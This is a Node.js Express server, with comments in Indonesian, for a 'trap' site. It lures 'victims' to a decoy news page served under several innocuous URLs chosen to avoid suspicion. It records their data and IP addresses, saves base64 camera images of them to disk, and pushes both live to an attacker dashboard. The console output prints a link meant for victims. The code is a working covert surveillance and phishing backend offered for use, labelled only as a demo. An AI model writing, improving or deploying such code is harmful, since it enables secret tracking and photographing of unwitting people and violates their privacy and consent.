// server.js - VERSI YANG SUDAH DIPERBAIKI
const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

// Middleware yang benar
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));
app.use(express.static("public"));

// Buat folder captures jika belum ada
if (!fs.existsSync("captures")) {
  fs.mkdirSync("captures");
}

// Database sederhana
let victims = [];
let photos = {};

// Serve halaman utama
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

// Serve halaman trap
app.get("/demo", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "trap.html"));
});

// Serve halaman berita setelah redirect
app.get("/berita", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

// Serve halaman berita dengan berbagai variasi URL agar tidak mencurigakan
app.get("/artikel", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/news", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/berita-terkini", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

// Handle semua request yang tidak ditemukan (404) redirect ke berita
app.use((req, res) => {
  res.redirect('/berita');
});

// API untuk menerima data - PERBAIKI ENDPOINT INI
app.post("/api/capture", (req, res) => {
  console.log("📥 Data received:", req.body);

  try {
    const data = req.body;

    // Validasi data
    if (!data || !data.victimId) {
      return res.status(400).json({ error: "Invalid data" });
    }

    // Tambahkan timestamp dan IP
    data.timestamp = new Date().toISOString();
    data.ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    // Cari victim yang sudah ada
    const existingIndex = victims.findIndex(
      (v) => v.victimId === data.victimId,
    );

    if (existingIndex >= 0) {
      // Merge data
      victims[existingIndex] = {
        ...victims[existingIndex],
        ...data,
        data: {
          ...victims[existingIndex].data,
          ...data.data,
        },
      };
    } else {
      // Victim baru
      victims.push(data);
    }

    // Kirim ke semua dashboard via socket
    io.emit("new-victim", data);

    // Simpan ke file log
    const logData = JSON.stringify(data) + "\n";
    fs.appendFileSync("victims.log", logData);

    res.json({ status: "ok", message: "Data captured" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ error: error.message });
  }
});

// API untuk menerima gambar
app.post("/api/capture-image", (req, res) => {
  try {
    const { image, victimId } = req.body;

    if (!image || !victimId) {
      return res.status(400).json({ error: "Invalid data" });
    }

    // Hapus header base64
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");

    // Simpan ke file
    const filename = `captures/${victimId}_${Date.now()}.jpg`;
    fs.writeFileSync(filename, base64Data, "base64");

    // Simpan di memory untuk ditampilkan
    photos[victimId] = image;

    // Kirim ke dashboard
    io.emit("new-photo", { victimId, image });

    res.json({ status: "ok", filename });
  } catch (error) {
    console.error("Error saving image:", error);
    res.status(500).json({ error: error.message });
  }
});

// Endpoint untuk testing
app.get("/api/test", (req, res) => {
  res.json({ status: "ok", message: "Server is running" });
});

// Socket.io connection
io.on("connection", (socket) => {
  console.log("📊 Dashboard terhubung");

  // Kirim data yang sudah ada
  socket.emit("init-data", victims);

  // Kirim photos yang sudah ada
  Object.keys(photos).forEach((victimId) => {
    socket.emit("new-photo", { victimId, image: photos[victimId] });
  });
});

const PORT = 3000;
server.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Demo server running di:`);
  console.log(`   - Local: http://localhost:${PORT}`);
  console.log(`   - Network: http://${getLocalIP()}:${PORT}`);
  console.log(`📤 Link untuk korban: http://localhost:${PORT}/demo`);
  console.log(`📊 Link dashboard: http://localhost:${PORT}`);
});

// Helper untuk mendapatkan IP lokal
function getLocalIP() {
  const { networkInterfaces } = require("os");
  const nets = networkInterfaces();

  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === "IPv4" && !net.internal) {
        return net.address;
      }
    }
  }
  return "127.0.0.1";
}
